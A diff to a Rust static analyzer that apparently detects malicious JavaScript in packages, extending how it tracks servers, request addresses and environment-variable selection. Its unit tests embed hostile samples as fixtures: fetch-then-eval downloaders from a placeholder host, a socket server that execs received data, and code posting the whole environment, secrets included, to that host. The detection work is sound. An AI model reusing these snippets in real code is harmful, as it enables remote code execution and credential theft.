@@ -312,6 +312,25 @@ pub(crate) fn bit_index(bit: u16) -> u8 {
     bit.trailing_zeros() as u8
 }
 
+/// A value without one kind of source (its parameters kept): nothing when
+/// that was all it held.
+pub(crate) fn sc_without(v: &V, bit: u16) -> V {
+    let sc = match v.sc.as_ref() {
+        Some(sc) if sc.kinds & bit != 0 => sc,
+        _ => return v.clone(),
+    };
+    let kinds = sc.kinds & !bit;
+    if kinds == 0 {
+        if v.params.is_empty() {
+            return V::empty();
+        }
+        return V::new(false, None, None, None, v.params.clone(), v.clean, v.built, v.kind);
+    }
+    let idx = bit_index(bit);
+    let firsts = sc.firsts.iter().filter(|f| f.0 != idx).cloned().collect();
+    V { sc: Some(Rc::new(Sc { kinds, firsts })), ..v.clone() }
+}
+
 // V.kind marks (bits 1 and 2 are project mode's request and response objects)
 
 /// a connection, or a request being written: its write, end, send … send
@@ -321,8 +340,14 @@ pub const OBJ_CONN: u8 = 4;
 pub const OBJ_CLIENT: u8 = 8;
 /// process.env itself: a member of it is one variable
 pub const OBJ_ENV: u8 = 16;
+/// a server the script made (`http.createServer()`): what it is sent is
+/// received — its request handler's arguments, its events' (`on('request'
+/// | 'connection', …)`) — but the server holds nothing it was sent: its
+/// address, its options and what a framework keeps beside it are not
+/// received data (vite's dev server)
+pub const OBJ_SERVER: u8 = 32;
 /// the marks a closure's variable keeps
-pub const MARKS: u8 = OBJ_CONN | OBJ_CLIENT | OBJ_ENV;
+pub const MARKS: u8 = OBJ_CONN | OBJ_CLIENT | OBJ_ENV | OBJ_SERVER;
 
 /// The categories a parameter's reach is recorded under: what is sent, and
 /// what only an address holds.
@@ -422,6 +447,13 @@ const LOOKUP: Spec = Spec { addresses: -1, composed: true };
 
 /// The HTTP clients a name no declaration binds is taken for.
 pub const CLIENT_GLOBALS: &[&str] = &["axios", "got", "needle", "superagent", "ky", "undici"];
+
+/// Names the platform defines besides GLOBAL_OBJECTS: no address of the
+/// script's own (sc_constant_text).
+const PLATFORM_NAMES: &[&str] = &[
+    "undefined", "NaN", "Infinity", "self", "global", "location", "top", "parent", "frames", "module", "exports",
+    "require", "define", "__dirname", "__filename",
+];
 
 const FETCH_MODULES: &[&str] = &[
     "node-fetch", "cross-fetch", "isomorphic-fetch", "isomorphic-unfetch", "make-fetch-happen", "minipass-fetch",
@@ -533,6 +565,28 @@ fn makes_connection(names: &[PyStr]) -> bool {
         )
     })
 }
+
+/// Does a call of these names make a server (OBJ_SERVER)?
+fn makes_server(names: &[PyStr]) -> bool {
+    names.iter().any(|n| {
+        is_one(
+            n,
+            &[
+                "http.createServer", "https.createServer", "http2.createServer", "http2.createSecureServer",
+                "net.createServer", "tls.createServer",
+            ],
+        )
+    })
+}
+
+/// A server's methods that register a listener of its events: the events
+/// that carry what it is sent (SERVER_DATA_EVENTS) give the listener
+/// received data; its other events (`error`, `listening`, `close`) don't.
+const SERVER_EVENTS: &[&str] = &["on", "once", "addListener", "prependListener", "prependOnceListener"];
+const SERVER_DATA_EVENTS: &[&str] = &[
+    "request", "connection", "secureConnection", "upgrade", "connect", "checkContinue", "checkExpectation",
+    "stream", "session", "message", "data",
+];
 
 /// Does a call of these names make a client (its calls send)?
 fn makes_client(names: &[PyStr]) -> bool {
@@ -1215,7 +1269,8 @@ impl<'p> Eval<'p> {
 
     /// Does an expression come from the function's caller: a parameter of
     /// a function around it, `this`, `arguments`, or what is made of them
-    /// (`options.url`, `` `${this.baseUrl}/x` ``)?
+    /// (`options.url`, `` `${this.baseUrl}/x` ``, a loop's variable over
+    /// `urls`)?
     pub(super) fn sc_from_caller(&mut self, node: NodeId, scope: ScopeId, depth: u32) -> bool {
         if depth > 16 || node == NONE {
             return false;
@@ -1241,10 +1296,17 @@ impl<'p> Eval<'p> {
                 if writes.iter().any(|w| matches!(w, Write::Param { .. })) {
                     return true;
                 }
-                // (a name given what comes from the caller)
+                // (a name given what comes from the caller; a loop's variable, an
+                // item or a key of what it walks)
                 return writes.iter().take(8).any(|w| match w {
                     Write::Init { node: v, scope: s, .. } | Write::Assign { node: v, scope: s, .. } => {
                         self.sc_from_caller(*v, *s, depth + 1)
+                    }
+                    Write::Opaque { node: v, scope: s }
+                        if matches!(self.a().kind(*v), Kind::ForOfStatement | Kind::ForInStatement) =>
+                    {
+                        let right = self.a().at(*v, jt::B);
+                        self.sc_from_caller(right, *s, depth + 1)
                     }
                     _ => false,
                 });
@@ -1281,18 +1343,131 @@ impl<'p> Eval<'p> {
         parts.into_iter().any(|p| !self.a().is_function(p) && self.sc_from_caller(p, scope, depth + 1))
     }
 
+    /// Is the value at `node` built from text the script writes: a string or
+    /// template literal, in it or in what a name it reads is given (a
+    /// constant's, an object or array literal's, a concatenation's part, a
+    /// branch's, a call's argument or receiver, an item of what a loop
+    /// walks), or from a global the page or another file defines (`src`)?
+    /// A request's address that isn't is no address of the script's own,
+    /// though its caller doesn't give it either: it is a library's, worked
+    /// out from what it is given (Monaco's module loader fetches the module
+    /// ids it is asked for, vitest's runner the modules a WebAssembly binary
+    /// imports), or no address (an object: a namespace TypeScript's emit
+    /// passes its module function).
+    pub(super) fn sc_constant_text(&mut self, node: NodeId, scope: ScopeId, depth: u32) -> bool {
+        let mut seen: Vec<BindId> = Vec::new();
+        self.sc_constant_text_in(node, scope, depth, true, &mut seen)
+    }
+
+    /// (each name read once: a name met again gave no constant the first
+    /// time, or the reading would have stopped there; `value`: the node is
+    /// read for its value, not called or read for a member)
+    fn sc_constant_text_in(&mut self, node: NodeId, scope: ScopeId, depth: u32, value: bool, seen: &mut Vec<BindId>) -> bool {
+        if depth > 16 || node == NONE {
+            return false;
+        }
+        let kind = self.a().kind(node);
+        let parts: Vec<NodeId> = match kind {
+            Kind::Literal => return self.a().is_string(node),
+            Kind::TaggedTemplateExpression => return true,
+            Kind::TemplateLiteral => {
+                let a = self.a();
+                if a.list(node, jt::A).iter().any(|&q| !a.s(q, jt::A).is_empty()) {
+                    return true;
+                }
+                a.list(node, jt::B).to_vec()
+            }
+            Kind::Identifier => {
+                let b = match self.bind(node, scope) {
+                    Some(b) => b,
+                    // a name no declaration in the file binds, read for its value,
+                    // is a global the page or another file defines (`axios.get(src)`):
+                    // no caller gives it and nothing here works it out, so it is
+                    // the script's own, as text is; the platform's objects (`window`,
+                    // `global`, `location`), and a global read for a member or
+                    // called (`location.href`, `new Map()`), are not
+                    None => {
+                        let name = self.a().name(node);
+                        return value && !is_in(GLOBAL_OBJECTS, name) && !is_one(name, PLATFORM_NAMES);
+                    }
+                };
+                if seen.contains(&b) {
+                    return false;
+                }
+                seen.push(b);
+                let (module, writes) = {
+                    let bind = &self.p.binds[b as usize];
+                    (bind.module, bind.writes.clone())
+                };
+                if module != self.m {
+                    return false;
+                }
+                return writes.iter().take(8).any(|w| match w {
+                    Write::Init { node: v, scope: s, .. } | Write::Assign { node: v, scope: s, .. } => {
+                        self.sc_constant_text_in(*v, *s, depth + 1, value, seen)
+                    }
+                    // (a loop's variable: an item, or a key, of what it walks)
+                    Write::Opaque { node: v, scope: s }
+                        if matches!(self.a().kind(*v), Kind::ForOfStatement | Kind::ForInStatement) =>
+                    {
+                        let right = self.a().at(*v, jt::B);
+                        self.sc_constant_text_in(right, *s, depth + 1, true, seen)
+                    }
+                    _ => false,
+                });
+            }
+            // (what a member is read from, and a call's callee, are not read for
+            // their value: a constant one still gives text, `'…'.concat(x)`)
+            Kind::MemberExpression => {
+                let (obj, prop, computed) = {
+                    let a = self.a();
+                    (a.at(node, jt::A), a.at(node, jt::B), a.computed(node))
+                };
+                return self.sc_constant_text_in(obj, scope, depth + 1, false, seen)
+                    || (computed && self.sc_constant_text_in(prop, scope, depth + 1, false, seen));
+            }
+            Kind::BinaryExpression | Kind::LogicalExpression => vec![self.a().at(node, jt::A), self.a().at(node, jt::B)],
+            Kind::ConditionalExpression => vec![self.a().at(node, jt::B), self.a().at(node, jt::C)],
+            Kind::UnaryExpression | Kind::AwaitExpression | Kind::ChainExpression | Kind::SpreadElement => {
+                vec![self.a().at(node, jt::A)]
+            }
+            Kind::AssignmentExpression => vec![self.a().at(node, jt::B)],
+            Kind::SequenceExpression => self.a().list(node, jt::A).iter().rev().take(1).copied().collect(),
+            Kind::ArrayExpression => self.a().list(node, jt::A).iter().copied().filter(|&e| e != NONE).collect(),
+            Kind::ObjectExpression => {
+                let props = self.a().list(node, jt::A).to_vec();
+                props
+                    .into_iter()
+                    .map(|p| if self.a().kind(p) == Kind::Property { self.a().at(p, jt::B) } else { self.a().at(p, jt::A) })
+                    .collect()
+            }
+            Kind::CallExpression | Kind::NewExpression => {
+                let callee = self.a().at(node, jt::A);
+                if !self.a().is_function(callee) && self.sc_constant_text_in(callee, scope, depth + 1, false, seen) {
+                    return true;
+                }
+                self.a().list(node, jt::B).to_vec()
+            }
+            _ => return false,
+        };
+        parts.into_iter().any(|p| !self.a().is_function(p) && self.sc_constant_text_in(p, scope, depth + 1, true, seen))
+    }
+
     /// Is a receiving call's address the script's own — what the script
     /// read or received (`fetch('https://…' + os.hostname())`, a dead drop's
-    /// address), or anything its caller doesn't give it — rather than one a
-    /// caller gives (a library's request for its user: `load(url)`,
-    /// `request(options)`, `${this.baseUrl}`)? A server's and a socket's data
-    /// are their own.
+    /// address), or text the script writes, or a global, that its caller
+    /// doesn't give it — rather than one a caller gives (a library's request
+    /// for its user: `load(url)`, `request(options)`, `${this.baseUrl}`, an
+    /// item of a list it is given) or one it works out from what it is given
+    /// (sc_constant_text)? A server's and a socket's data are their own.
     fn sc_own_address(&mut self, node: NodeId, names: &[PyStr], member: bool, args: &[V], scope: ScopeId) -> bool {
         let arg_nodes = self.a().list(node, jt::B).to_vec();
         let own = |me: &mut Self, i: usize| -> bool {
             match (arg_nodes.get(i), args.get(i)) {
-                (Some(&n), Some(v)) => (v.src && v.params.is_empty()) || !me.sc_from_caller(n, scope, 0),
-                (Some(&n), None) => !me.sc_from_caller(n, scope, 0),
+                (Some(&n), Some(v)) => {
+                    (v.src && v.params.is_empty()) || (!me.sc_from_caller(n, scope, 0) && me.sc_constant_text(n, scope, 0))
+                }
+                (Some(&n), None) => !me.sc_from_caller(n, scope, 0) && me.sc_constant_text(n, scope, 0),
                 _ => false,
             }
         };
@@ -1327,7 +1502,8 @@ impl<'p> Eval<'p> {
 
     /// A call of the script's own downloader (its parameter `i` is a
     /// request's address: `const get = (u) => fetch(u)`), given the
-    /// script's own address: what it returns is received.
+    /// script's own address (as sc_own_address reads one): what it returns
+    /// is received.
     pub(super) fn sc_wrapper_receives(&mut self, node: NodeId, i: usize, t: &V) -> Option<V> {
         let arg = {
             let a = self.a();
@@ -1341,7 +1517,7 @@ impl<'p> Eval<'p> {
             *args.get(i)?
         };
         let scope = self.cur;
-        if !((t.src && t.params.is_empty()) || !self.sc_from_caller(arg, scope, 0)) {
+        if !((t.src && t.params.is_empty()) || (!self.sc_from_caller(arg, scope, 0) && self.sc_constant_text(arg, scope, 0))) {
             return None;
         }
         let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
@@ -2120,6 +2296,137 @@ impl<'p> Eval<'p> {
         out
     }
 
+    /// A method call on an instance (not on `this`) of a class made in
+    /// several places (descs::Program::sc_made_widely)?
+    fn sc_instance_call(&mut self, callee: NodeId, fids: &[FnId]) -> bool {
+        if self.a().kind(self.a().at(callee, jt::A)) == Kind::ThisExpression {
+            return false;
+        }
+        fids.iter().any(|&f| match self.p.fns[f as usize].cls {
+            Some(c) => self.p.sc_made_widely(c),
+            None => false,
+        })
+    }
+
+    /// Is a call made on an instance from outside it — `new C(…)`, `s.m(…)`
+    /// — not on `this` (`this.m(…)`, `super(…)`, `super.m(…)`)? What a
+    /// method of a class made in several places is given there goes to
+    /// that instance, not to every instance's `this.x` (apply).
+    pub(super) fn sc_on_instance(&self, node: NodeId) -> bool {
+        if self.p.cfg.supply.is_none() {
+            return false;
+        }
+        let a = self.a();
+        match a.kind(node) {
+            Kind::NewExpression => true,
+            Kind::CallExpression => {
+                let callee = a.unwrap(a.at(node, jt::A));
+                match a.kind(callee) {
+                    Kind::Super => false,
+                    Kind::MemberExpression => !matches!(a.kind(a.at(callee, jt::A)), Kind::ThisExpression | Kind::Super),
+                    _ => true,
+                }
+            }
+            _ => false,
+        }
+    }
+
+    /// A for-in or for-of loop over the environment's variables whose body
+    /// is a test of them alone, one that selects some (`for (const k in
+    /// process.env) if (k.startsWith('VITE_')) env[k] = process.env[k]`):
+    /// what it reads is not the whole environment, unless the test excludes
+    /// some or names secrets (the `.filter` rule; the text follower's
+    /// _LD_ENV_SELECT_RE).
+    pub(super) fn sc_loop_selects_env(&self, st: NodeId, it: &V) -> bool {
+        if !it.sc.as_ref().is_some_and(|s| s.kinds & K_WHOLE_ENV != 0) {
+            return false;
+        }
+        let a = self.a();
+        // the loop's variables
+        let left = a.at(st, jt::A);
+        let pats: Vec<NodeId> = if a.kind(left) == Kind::VariableDeclaration {
+            a.list(left, jt::A).iter().map(|&d| a.at(d, jt::A)).collect()
+        } else {
+            vec![left]
+        };
+        let names: Vec<PyStr> =
+            pats.iter().flat_map(|&p| a.pattern_names(p)).map(|(id, _)| a.name(id).to_vec()).collect();
+        if names.is_empty() {
+            return false;
+        }
+        // its body: one if statement, no else
+        let mut body = a.at(st, jt::C);
+        if a.kind(body) == Kind::BlockStatement {
+            match a.list(body, jt::A) {
+                [only] => body = *only,
+                _ => return false,
+            }
+        }
+        if a.kind(body) != Kind::IfStatement || a.opt(body, jt::C).is_some() {
+            return false;
+        }
+        let test = a.at(body, jt::A);
+        // (a test of the loop's variables)
+        let mut stack = vec![test];
+        let mut reads = false;
+        while let Some(n) = stack.pop() {
+            if a.kind(n) == Kind::Identifier && names.iter().any(|x| x.as_slice() == a.name(n)) {
+                reads = true;
+                break;
+            }
+            stack.extend(a.kids(n));
+        }
+        if !reads {
+            return false;
+        }
+        self.sc_selects(test)
+    }
+
+    /// Does a test of the environment's variables select some, not exclude
+    /// some or name secrets (_LD_EXCLUDES_RE, _SH_SECRET_VAR_RE in its text)?
+    /// What the names it reads are given in this file counts as its text: a
+    /// list of patterns (`sensitivePatterns.some((p) => p.test(k))`, where
+    /// the list holds /TOKEN/ and /SECRET/), a parameter's default
+    /// (vite's `prefixes = 'VITE_'`).
+    pub(super) fn sc_selects(&self, test: NodeId) -> bool {
+        let sup = self.sup();
+        let p = sup.p();
+        let a = self.a();
+        let (lo, hi) = (a.0.nodes[test as usize].start, a.0.nodes[test as usize].end);
+        let cond = sup.span(lo, hi);
+        if p.re("_LD_EXCLUDES_RE").search(cond).is_some() || p.re("_SH_SECRET_VAR_RE").search(cond).is_some() {
+            return false;
+        }
+        // the names the test reads (not a member's name), bound outside it
+        let mut given: Vec<(u32, u32)> = Vec::new();
+        let mut seen: Vec<BindId> = Vec::new();
+        let mut stack = vec![test];
+        while let Some(n) = stack.pop() {
+            match a.kind(n) {
+                Kind::Identifier => {
+                    let b = self.p.mods[self.m as usize].bind_at[n as usize];
+                    if b == UNSET || b == GLOBAL || seen.contains(&b) || seen.len() >= 8 {
+                        continue;
+                    }
+                    seen.push(b);
+                    for w in self.p.binds[b as usize].writes.iter().take(8) {
+                        let node = match w {
+                            Write::Init { node, .. } | Write::Assign { node, .. } | Write::Param { node, .. } => *node,
+                            _ => continue,
+                        };
+                        let span = (a.0.nodes[node as usize].start, a.0.nodes[node as usize].end);
+                        if self.p.binds[b as usize].module == self.m && !(lo <= span.0 && span.1 <= hi) {
+                            given.push(span);
+                        }
+                    }
+                }
+                Kind::MemberExpression if !a.computed(n) => stack.push(a.at(n, jt::A)),
+                _ => stack.extend(a.kids(n)),
+            }
+        }
+        given.iter().all(|&(s, e)| p.re("_SH_SECRET_VAR_RE").search(sup.span(s, e.min(s + 4000))).is_none())
+    }
+
     /// `this.x` in a method of a class or an object literal: the binding
     /// the model keeps for that member (made when first met), or None.
     pub(super) fn sc_this_member(&mut self, member: NodeId, scope: ScopeId) -> Option<BindId> {
@@ -2156,6 +2463,9 @@ impl<'p> Eval<'p> {
             refs: Vec::new(),
             targets: None,
         });
+        if owner.0 == 1 {
+            self.p.sc_this_class.insert(bid, owner.1);
+        }
         self.p.sc_props.insert(key, bid);
         Some(bid)
     }
@@ -2350,13 +2660,9 @@ impl<'p> Eval<'p> {
         // .filter(([k]) => k.startsWith('X_'))`) is not the whole of it, unless
         // the test excludes some or names secrets (the text follower's _LD_ENV_SELECT_RE)
         if member && named("filter") && recv.sc.as_ref().is_some_and(|s| s.kinds & K_WHOLE_ENV != 0) {
-            let sup = self.sup();
-            let a = self.a();
-            let list = a.list(node, jt::B);
-            if let (Some(&f), Some(&l)) = (list.first(), list.last()) {
-                let cond = sup.span(a.0.nodes[f as usize].start, a.0.nodes[l as usize].end);
-                let p = sup.p();
-                if p.re("_LD_EXCLUDES_RE").search(cond).is_none() && p.re("_SH_SECRET_VAR_RE").search(cond).is_none() {
+            let first = self.a().list(node, jt::B).first().copied();
+            if let Some(f) = first {
+                if self.sc_selects(f) {
                     return Ok(V::empty());
                 }
             }
@@ -2400,6 +2706,14 @@ impl<'p> Eval<'p> {
                 let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
                 v = v.union(&union_all(&plains)).union(&recv.plain());
             }
+            // (an instance of a class made in several places is a container:
+            // what its methods are given it holds, what it holds they give back)
+            if member && self.sc_instance_call(callee, &fids) {
+                let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
+                let given = union_all(&plains);
+                v = v.union(&given).union(&recv.plain());
+                self.member_write(callee, &given, scope);
+            }
         } else if name.as_deref().is_some_and(|n| is_in(CLEAN_RESULT, n)) {
             v = V::empty();
         } else if receiving {
@@ -2414,6 +2728,8 @@ impl<'p> Eval<'p> {
                 v = v.with_built();
             }
         }
+        // (a server holds nothing it is sent, nor what its handler returns: OBJ_SERVER, below)
+        let server = receiving && makes_server(&names);
         // callbacks of anything but the script's functions get what the call
         // holds, and what it receives (a request's callbacks, only that)
         if fids.is_empty() {
@@ -2421,14 +2737,35 @@ impl<'p> Eval<'p> {
             for a in args.iter().filter(|_| !receiving) {
                 held = held.union(&a.plain());
             }
+            // (what a server the script made is sent: its events' arguments; an
+            // event named by anything but a literal may be one of them)
+            let data_event = || -> bool {
+                let a = self.a();
+                match a.list(node, jt::B).first() {
+                    Some(&e) if a.is_string(e) => a.str_value(e).is_some_and(|v| is_one(v, SERVER_DATA_EVENTS)),
+                    _ => true,
+                }
+            };
+            if member
+                && recv.kind & OBJ_SERVER != 0
+                && name.as_deref().is_some_and(|n| is_one(n, SERVER_EVENTS))
+                && data_event()
+            {
+                let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
+                held = held.union(&self.sc_source(K_RECEIVED, u("a server"), at, line, 0));
+            }
             let cb = self.sc_callbacks(node, &held, scope);
-            v = v.union(&cb.plain());
+            if !server {
+                v = v.union(&cb.plain());
+            }
             // a runner given as the callback runs it: `.then(eval)`
             if held.tainted() {
                 self.sc_runner_args(node, &held, scope);
             }
         }
-        v = v.union(&got);
+        if !server {
+            v = v.union(&got);
+        }
         // a container a value is put into holds it
         if member && (named("push") || named("unshift")) {
             let obj = self.a().at(callee, jt::A);
@@ -2456,6 +2793,9 @@ impl<'p> Eval<'p> {
         }
         if makes_client(&names) {
             mark |= OBJ_CLIENT;
+        }
+        if server {
+            mark |= OBJ_SERVER;
         }
         if member && recv.kind & OBJ_CONN != 0 && name.as_deref().is_some_and(|n| is_one(n, CONN_CHAIN)) {
             mark |= OBJ_CONN;
@@ -3141,5 +3481,150 @@ mod tests {
         // a text read sliced is not a binary's
         let src = "const fs = require('fs');\nconst { spawn } = require('child_process');\nconst s = fs.readFileSync('a.txt', 'utf8').slice(10);\nfs.writeFileSync('/tmp/a', s);\nspawn('/tmp/a');\n";
         assert_eq!(dropped(src), None);
+    }
+
+    #[test]
+    fn what_popular_packages_do() {
+        // a library's loader fetches the address it is given, or works out
+        // from what it is given (Monaco's, vitest's): not the script's own
+        // download; the script's own address is
+        let given = "function load(u) {\n  fetch(u).then((r) => r.text()).then((t) => { new Function(t).call(self); });\n}\nmodule.exports = load;\n";
+        assert_eq!(runs(given), None);
+        let method = "class Loader {\n  load(e, i, s, n) {\n    fetch(i).then((o) => o.text()).then((o) => { new Function(o).call(self); s(); });\n  }\n}\nmodule.exports = Loader;\n";
+        assert_eq!(runs(method), None);
+        let config = "class Loader {\n  load(e, i, s, n) {\n    const { trustedTypesPolicy: l } = e.getConfig().getOptionsLiteral();\n    fetch(i).then((o) => o.text()).then((o) => { (l ? self.eval(l.createScript('', o)) : new Function(o)).call(self); s(); });\n  }\n}\nmodule.exports = Loader;\n";
+        assert_eq!(runs(config), None);
+        assert_eq!(runs(&format!("fetch('https://{}/p').then((r) => r.text()).then((t) => {{ new Function(t)(); }});\n", HOST)), Some("run"));
+        assert_eq!(runs(&format!("const base = 'https://{}';\nfetch(base + '/p').then((r) => r.text()).then(eval);\n", HOST)), Some("run"));
+        // an item of a list the script writes (a fallback's addresses) is its own
+        let fallback = format!(
+            "const axios = require('axios');\nconst domain = 'api.' + 'invalid';\nconst check = async () => {{\n  const urls = [`https://${{domain}}/a`, `https://{}/b`];\n\
+             for (const url of urls) {{\n    const response = await axios.get(url);\n    new Function('require', response.data.model)(require);\n  }}\n}};\nmodule.exports = check;\n",
+            HOST
+        );
+        assert_eq!(runs(&fallback), Some("run"));
+        // a global the script reads as a value (what the page or another
+        // file defines) is its own address, given to a request or to the
+        // script's own downloader; the platform's objects are not, nor is
+        // an object (a namespace TypeScript's emit passes its module function:
+        // Monaco's AMDLoader)
+        assert_eq!(runs("const axios = require('axios');\n(async function () {\n  const s = (await axios.get(src)).data;\n  eval(s);\n})();\n"), Some("run"));
+        let get = "const get = (u) => fetch(u).then((r) => r.text());\n";
+        assert_eq!(runs(&format!("{}get(src).then((t) => eval(t));\n", get)), Some("run"));
+        assert_eq!(runs(&format!("{}get('https://{}/' + process.platform).then((t) => eval(t));\n", get, HOST)), Some("run"));
+        assert_eq!(runs(&format!("{}get(typeof window !== 'undefined' ? window : global).then((t) => eval(t));\n", get)), None);
+        assert_eq!(runs(&format!("{}get(location).then((t) => eval(t));\n", get)), None);
+        assert_eq!(runs(&format!("var NS;\n{}get(NS || (NS = {{}})).then((t) => eval(t));\n", get)), None);
+        // what a server is sent is received: its handler's request, its
+        // data events; the server itself, its address and options, and its
+        // other events are not (vite's dev server)
+        let body = "const http = require('http');\nhttp.createServer((req, res) => { let b = ''; req.on('data', (d) => b += d); req.on('end', () => eval(b)); }).listen(8080);\n";
+        assert_eq!(runs(body), Some("run"));
+        let event = "const http = require('http');\nconst server = http.createServer();\nserver.on('request', (req, res) => { req.on('data', (d) => eval(d.toString())); });\nserver.listen(8080);\n";
+        assert_eq!(runs(event), Some("run"));
+        let socket = "const net = require('net');\nnet.createServer((sock) => { sock.on('data', (d) => require('child_process').exec(d.toString())); }).listen(4444);\n";
+        assert_eq!(runs(socket), Some("run"));
+        let itself = "const http = require('http');\nfunction makeApp(cfg) { return { url: 'http://localhost:' + cfg.port, cfg }; }\nconst server = http.createServer((req, res) => res.end('ok'));\nconst app = makeApp({ port: 3000, server });\neval(app.cfg.server.address().port.toString());\n";
+        assert_eq!(runs(itself), None);
+        let error = "const http = require('http');\nconst server = http.createServer();\nserver.on('error', (e) => eval(e.message));\n";
+        assert_eq!(runs(error), None);
+        // a Node module's objects are Node's: createHash(…).update(k) is not
+        // the script's update(), which other code's value would reach
+        let hash = format!(
+            "const https = require('https');\nconst {{ createHash }} = require('crypto');\nclass Doc {{ update(s, e, content) {{ this.c = content; }} toString() {{ return this.c; }} }}\n\
+             const d = new Doc();\nhttps.get('https://{}/x', (res) => {{ res.on('data', (k) => {{ createHash('sha1').update(k); }}); }});\neval(d.toString());\n",
+            HOST
+        );
+        assert_eq!(runs(&hash), None);
+        // createRequire makes a require, under any name, through a bundler's wrapper
+        let made = format!(
+            "import {{ createRequire }} from 'module';\nconst require = createRequire(import.meta.url);\n\
+             require('https').get('https://{}/x', (r) => {{ let b = ''; r.on('data', (c) => {{ b += c; }}); r.on('end', () => eval(b)); }});\n",
+            HOST
+        );
+        assert_eq!(runs(&made), Some("run"));
+        let shim = format!(
+            "import {{ createRequire }} from 'node:module';\nvar __require = /* @__PURE__ */ (() => createRequire(import.meta.url))();\n\
+             const cp = __require('child_process');\nconst https = __require('https');\n\
+             https.get('https://{}/x', (r) => {{ let b = ''; r.on('data', (c) => {{ b += c; }}); r.on('end', () => cp.exec(b)); }});\n",
+            HOST
+        );
+        assert_eq!(runs(&shim), Some("run"));
+    }
+
+    #[test]
+    fn a_selection_of_the_environment_in_a_loop() {
+        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: JSON.stringify({}) }});\n", HOST, v);
+        // a loop whose test selects variables by name (vite's loadEnv)
+        let src = format!("const env = {{}};\nfor (const k in process.env) if (k.startsWith('VITE_')) env[k] = process.env[k];\n{}", post("env"));
+        assert_eq!(sent(&src), None);
+        let src = format!(
+            "const env = {{}};\nfor (const k of Object.keys(process.env)) {{ if (k.startsWith('APP_')) {{ env[k] = process.env[k]; }} }}\n{}",
+            post("env")
+        );
+        assert_eq!(sent(&src), None);
+        // a test that excludes some, names secrets, or doesn't read the
+        // variable selects nothing: the whole environment
+        let src = format!("const env = {{}};\nfor (const k in process.env) if (!k.startsWith('npm_')) env[k] = process.env[k];\n{}", post("env"));
+        assert_eq!(sent(&src), found("environment", "the whole environment"));
+        let src = format!("const out = {{}};\nfor (const [k, v] of Object.entries(process.env)) if (k.includes('TOKEN')) out[k] = v;\n{}", post("out"));
+        assert_eq!(sent(&src), found("environment", "the whole environment"));
+        let src = format!(
+            "const env = {{}};\nconst verbose = process.argv.length > 2;\nfor (const k in process.env) {{ if (verbose) {{ env[k] = process.env[k]; }} }}\n{}",
+            post("env")
+        );
+        assert_eq!(sent(&src), found("environment", "the whole environment"));
+        // (a body that does more than test them: no selection)
+        let src = format!("const env = {{}};\nfor (const k in process.env) {{ env[k] = process.env[k]; if (k.startsWith('X_')) break; }}\n{}", post("env"));
+        assert_eq!(sent(&src), found("environment", "the whole environment"));
+        // what the names a test reads are given is its text: a list of secrets' patterns, a
+        // prefix parameter's default
+        let src = format!(
+            "const sensitive = [/TOKEN/i, /SECRET/i, /^AWS_/i];\nconst out = {{}};\n\
+             for (const [k, v] of Object.entries(process.env)) {{\n  if (sensitive.some((p) => p.test(k))) out[k] = v;\n}}\n{}",
+            post("out")
+        );
+        assert_eq!(sent(&src), found("environment", "the whole environment"));
+        let src = format!(
+            "function load(prefixes = ['VITE_']) {{\n  const env = {{}};\n\
+             for (const key in process.env) if (prefixes.some((p) => key.startsWith(p))) env[key] = process.env[key];\n  return env;\n}}\n{}",
+            post("load()")
+        );
+        assert_eq!(sent(&src), None);
+        // the .filter rule reads them the same way
+        let src = format!(
+            "const KEYS = ['GITHUB_TOKEN', 'NPM_TOKEN'];\nconst out = Object.entries(process.env).filter(([k]) => KEYS.includes(k));\n{}",
+            post("out")
+        );
+        assert_eq!(sent(&src), found("environment", "the whole environment"));
+    }
+
+    #[test]
+    fn instances_of_a_class_made_in_several_places() {
+        // each instance holds what it is given; one's members are not
+        // another's (every MagicString of vite's plugins)
+        let other = "class S { constructor(c) { this.c = c; } update(x) { this.c = this.c + x; return this; } toString() { return this.c; } }\n\
+                     const s1 = new S('a');\ns1.update(Buffer.from(process.argv[2], 'hex').toString());\nconst s2 = new S(process.argv[3]);\neval(s2.toString());\n";
+        assert_eq!(decoded(other), vec![]);
+        let same = "class S { constructor(c) { this.c = c; } update(x) { this.c = this.c + x; return this; } toString() { return this.c; } }\n\
+                    const s1 = new S('a');\ns1.update(Buffer.from(process.argv[2], 'hex').toString());\nconst s2 = new S('b');\neval(s1.toString());\n";
+        assert_eq!(decoded(same), vec![(5, 3)]);
+        let made = "class Box { constructor(v) { this.v = v; } get() { return this.v; } }\nconst a = new Box('x');\n\
+                    const b = new Box(Buffer.from(process.argv[2], 'base64').toString());\neval(b.get());\n";
+        assert_eq!(decoded(made), vec![(4, 3)]);
+        // what its methods read themselves is still every instance's
+        let fetched = format!(
+            "class Loader {{ constructor() {{ this.code = null; }} async load() {{ const r = await fetch('https://{}/p'); this.code = await r.text(); }} run() {{ eval(this.code); }} }}\n\
+             const l = new Loader();\nconst l2 = new Loader();\nl.load().then(() => l.run());\n",
+            HOST
+        );
+        assert_eq!(runs(&fetched), Some("run"));
+        // a class made once keeps one binding per member
+        let once = format!(
+            "class Runner {{ setCode(c) {{ this.c = c; }} run() {{ eval(this.c); }} }}\nconst r1 = new Runner();\n\
+             fetch('https://{}/p').then((x) => x.text()).then((t) => {{ r1.setCode(t); r1.run(); }});\n",
+            HOST
+        );
+        assert_eq!(runs(&once), Some("run"));
     }
 }
